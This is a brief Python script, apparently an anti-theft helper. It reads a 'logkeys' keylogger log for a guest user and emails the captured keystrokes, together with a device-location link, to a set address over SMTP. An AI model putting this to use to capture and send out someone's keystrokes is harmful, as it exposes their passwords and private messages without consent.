#!/usr/bin/env python3

import sys
import smtplib

username = "<SENDER EMAIL>"
password = "<SENDER PASSWORD>"
servername = "<SERVER SMTP NAME>"
port = <SERVER PORT NUMBER>
destination = "<DESTINATION EMAIL>"

message = """\
Subject: Guest Access

Your device is currently been used by a Guest User.

Use this link to locate it:
https://locationmagic.org/locate and insert the Token <TOKEN>\n\n"""

user = sys.argv[1]
with open('/tmp/' + user + '/.config/logkeys/user.log', 'r') as f:
    for line in f:
        message = message + line

server = smtplib.SMTP(servername, port)
server.ehlo()
server.starttls()
server.ehlo()
server.login(username, password)
server.sendmail(
  username, 
  destination, 
  message)
server.quit()

print('Done!')    
